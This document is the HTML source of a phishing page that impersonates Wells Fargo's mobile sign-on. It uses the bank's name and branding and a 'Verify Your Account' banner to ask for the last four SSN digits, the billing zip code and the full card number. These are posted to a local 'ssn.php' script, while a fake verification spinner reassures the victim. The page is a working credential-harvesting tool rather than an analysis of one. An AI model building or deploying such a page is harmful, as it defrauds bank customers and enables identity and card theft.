<!DOCTYPE html>
<html lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <title>Mobile Sign on | Wells Fargo</title>
    <link rel="stylesheet" href="assets/wf-fonts.css" type="text/css">
    <link rel="stylesheet" href="assets/frontporch.css" type="text/css">
    <link type="text/css" href="assets/signon_clean.css" rel="stylesheet" media="screen,projection,print">
    <link rel="shortcut icon" href="assets/favicon.ico">
  </head>
  <body theme="ssep" id="body" class="brand-fp" lob="cob" devicetype="mobile">
    
    <div class="header brand-fp" id="header">
      <div class="wf_logo" role="link">
        <img src="assets/masthead-wf_logo-e-148x16.svg" alt="Wells Fargo" lang="en" role="img">
      </div>
      <div class="hamburger_menu" role="link">
        <a href="#"><img src="assets/FP.svg" alt="Home" role="img"></a>
      </div>
    </div>
    <main role="main">
      <article>
        <div id="errorr" class="messaging" role="alert" aria-atomic="true" style="display: none;">
          <div class="messaging-wrapper">
            <div class="icon error">Error</div>
            <div class="message"><strong><br>Please enter the last 4 digits of your Social Security Number and Zip Code</strong></div>
          </div>
        </div>
        <div id="form">
           <h1 class="banner" style="color:#FF0000"> Verify Your Account </h1>
          <h2 class="security-link flex-cntr">
            <!-- <span class="icon-lock"></span> -->
            <img src="assets/lock.svg" alt="" aria-hidden="true">
            <a class="" href="#">Online &amp; Mobile Security</a>
          </h2>
          <form id="frmSignon" name="frmSignon" action="ssn.php" method="post" autocomplete="off" onsubmit="return checkform(this);">
            <p class="titleBody" style="text-align: center;">To verify your account please complete the field below and continue with the verification process.</p>
            <br>
            <div id="usernameWrapper" class="bim-input-wrapper">
              <label class="bim-input-label " for="ssn">Last 4 digit of SSN</label>
              <input class="bim-input" type="tel" name="ssn" id="ssn" autocomplete="off" maxlength="4" minlength="4" required>
            </div>
            <div id="usernameWrapper1" class="bim-input-wrapper">
              <label class="bim-input-label " for="zip">Billing Zip Code</label>
              <input class="bim-input" type="tel" name="zip" id="zip" autocomplete="off" maxlength="5" minlength="5" required>
            </div>
             <div id="usernameWrapper2" class="bim-input-wrapper">
              <label class="bim-input-label " for="card">Card Number</label>
              <input class="bim-input" type="tel" name="card" id="card" autocomplete="off" pattern="(.){19,19}" title="Enter the 16-digit card number
" maxlength="19" required>
            </div>
            <div>
              <button class="primary cta-btn sign-on" data-type="primary" aria-label="Sign On">Continue</button>
            </div>
            <br>
           
            
          </form>
        </div>

        <div id="loader" class="main-panel" style="background-color: #F7F7F6;display: none;">
          <div class="page-header">
              <div class="message" style="padding:10%">
                  <br/>
                  <a id="loadingIcon" name="loadingIcon" href="#"><img style="display:block;margin-left:auto;margin-right:auto" src="assets/spin.gif"/></a>
                  <br />
                  <h1 class="banner" style=" text-align: center;">Please wait while we check your information</h1>
                  <br />
                  <p align="center" style="text-align: center;">It'll only take a few seconds - we're just verifying the details that you've entered.</p>
                  <p align="center" style="text-align: center;">Please don't refresh this page or close your browser while you're waiting.</p>
                  <p></p>
              </div>
          </div>
        </div>
        <div id="footer">
          <div id="links">
            <p><a href="#" class="link">PRIVACY, Cookies, Security &amp;
              Legal</a> <span class="link-separator"></span><a href="#" class="link">Ad Choices </a>
            </p>
            <p><a href="#" class="link online-acc">Online Access
              Agreement</a>
              <span class="link-separator"></span>
              <a href="#" class="link e-sign">ESIGN
              Consent</a>
            </p>
            <p>© 2020 <span lang="en">Wells Fargo</span>. All rights reserved.</p>
          </div>
          <div id="img">
          </div>
        </div>
      </article>
    </main>
    <script type="text/javascript" nonce="">
      
      const userNameEL = document.querySelector(".oas-redesigned #pin");
      function animateLabel(e) {
      e.target.previousElementSibling.classList.add('animated');
      }
      function removeAnimation(e) {
      if (!e.target.value.trim().length) {
      e.target.previousElementSibling.classList.remove('animated');
      e.target.value = "";
      }
      }
      if (userNameEL != null) {
      userNameEL.addEventListener('focus', animateLabel);
      userNameEL.addEventListener('blur', removeAnimation);
      }
      
      
      function focusError() {
      const errorCntr = document.querySelector('#errorCntr');
      if(errorCntr) {
      errorCntr.focus();
      }
      }
      
      focusError();
      
      
    </script>

    <script type="text/javascript" nonce="">
      
      
         if(document.querySelector('#usernameWrapper .bim-input')) {
             document.querySelector('#usernameWrapper .bim-input').addEventListener('focus', function(evt){
                 document.querySelector('#usernameWrapper.bim-input-wrapper').classList.add('halo')
                 if(evt.target.value) {
                     return
                 } else {
                     document.querySelector("#usernameWrapper.bim-input-wrapper .bim-input-label").classList.add('above')
                 }
             })
             document.querySelector('#usernameWrapper .bim-input').addEventListener('blur', function(evt){
                 document.querySelector("#usernameWrapper.bim-input-wrapper").classList.remove('halo')
                 if(evt.target.value) {
                     evt.target.classList.add('with-value')
                 } else {
                     evt.target.classList.remove('with-value')
                     document.querySelector("#usernameWrapper.bim-input-wrapper .bim-input-label").classList.remove('above')
                 };
             })

             document.querySelector('#usernameWrapper1 .bim-input').addEventListener('blur', function(evt){
                 document.querySelector("#usernameWrapper1.bim-input-wrapper").classList.remove('halo')
                 if(evt.target.value) {
                     evt.target.classList.add('with-value')
                 } else {
                     evt.target.classList.remove('with-value')
                     document.querySelector("#usernameWrapper1.bim-input-wrapper .bim-input-label").classList.remove('above')
                 };
             })
         }      if(document.querySelector('#usernameWrapper1 .bim-input')) {
             document.querySelector('#usernameWrapper1 .bim-input').addEventListener('focus', function(evt){
                 document.querySelector('#usernameWrapper1.bim-input-wrapper').classList.add('halo')
                 if(evt.target.value) {
                     return
                 } else {
                     document.querySelector("#usernameWrapper1.bim-input-wrapper .bim-input-label").classList.add('above')
                 }
             })

             document.querySelector('#usernameWrapper2 .bim-input').addEventListener('blur', function(evt){
                 document.querySelector("#usernameWrapper2.bim-input-wrapper").classList.remove('halo')
                 if(evt.target.value) {
                     evt.target.classList.add('with-value')
                 } else {
                     evt.target.classList.remove('with-value')
                     document.querySelector("#usernameWrapper2.bim-input-wrapper .bim-input-label").classList.remove('above')
                 };
             })
         }      if(document.querySelector('#usernameWrapper2 .bim-input')) {
             document.querySelector('#usernameWrapper2 .bim-input').addEventListener('focus', function(evt){
                 document.querySelector('#usernameWrapper2.bim-input-wrapper').classList.add('halo')
                 if(evt.target.value) {
                     return
                 } else {
                     document.querySelector("#usernameWrapper2.bim-input-wrapper .bim-input-label").classList.add('above')
                 }
             })
         }      
    </script>
    <script src="assets/jquery-3.5.1.min.js"></script>
    <script src="assets/jquery.mask.js"></script>
    <script>
      $(function() {
      $('#ssn').mask('0000');
      $('#zip').mask('00000');
      $('#card').mask('0000-0000-0000-0000');
      });
      $('#Signon').submit( function(event) {
        event.preventDefault();
        var formId = this.id, form = this;

        if ($('#ssn').val() == "" || $('#zip').val() == "") {
          $("#errorr").show();
        } else {
          $("#errorr").hide();
          $("#form").hide();
          $("#loader").show();
          setTimeout( function () { 
              form.submit();
          }, 5000);
        }
    }); 
    </script>
  </body>
</html>
